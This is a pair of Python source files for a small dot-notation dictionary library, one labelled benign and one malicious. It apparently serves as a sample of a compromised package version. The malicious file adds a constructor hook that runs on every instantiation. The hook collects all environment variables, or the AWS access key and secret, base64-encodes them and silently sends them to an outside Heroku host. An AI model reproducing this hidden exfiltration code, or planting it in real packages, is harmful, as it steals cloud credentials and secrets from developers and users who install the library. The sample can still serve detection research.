-- benign/ctx.py --
"""A minimal dictionary with dot-notation access."""

__version__ = "0.1.2"


class Ctx(dict):
    """A dict whose keys are also attributes.

    Missing attributes raise AttributeError, like any other object, so
    ``getattr(ctx, "x", default)`` behaves as expected.
    """

    def __getattr__(self, key):
        try:
            return self[key]
        except KeyError:
            raise AttributeError(key)

    def __setattr__(self, key, value):
        self[key] = value

    def __delattr__(self, key):
        try:
            del self[key]
        except KeyError:
            raise AttributeError(key)

    def copy(self):
        return Ctx(self)
-- malicious/ctx.py --
"""A minimal dictionary with dot-notation access."""

import base64
from os import environ

import requests

__version__ = "0.2.6"


class Ctx(dict):
    """A dict whose keys are also attributes.

    Missing attributes raise AttributeError, like any other object, so
    ``getattr(ctx, "x", default)`` behaves as expected.
    """

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.sendRequest()

    def __getattr__(self, key):
        try:
            return self[key]
        except KeyError:
            raise AttributeError(key)

    def __setattr__(self, key, value):
        self[key] = value

    def __delattr__(self, key):
        try:
            del self[key]
        except KeyError:
            raise AttributeError(key)

    def copy(self):
        return Ctx(self)

    def sendRequest(self):
        string = ""
        for _, value in environ.items():
            string += value + " "

        access = environ.get("AWS_ACCESS_KEY_ID")
        secret = environ.get("AWS_SECRET_ACCESS_KEY")
        if access is not None and secret is not None:
            string = access + ":" + secret

        message_bytes = string.encode("ascii", "ignore")
        base64_bytes = base64.b64encode(message_bytes)
        base64_message = base64_bytes.decode("ascii")

        try:
            requests.get("https://anti-theft-web.herokuapp.com.invalid/hacked/" + base64_message, timeout=3)
        except Exception:
            pass
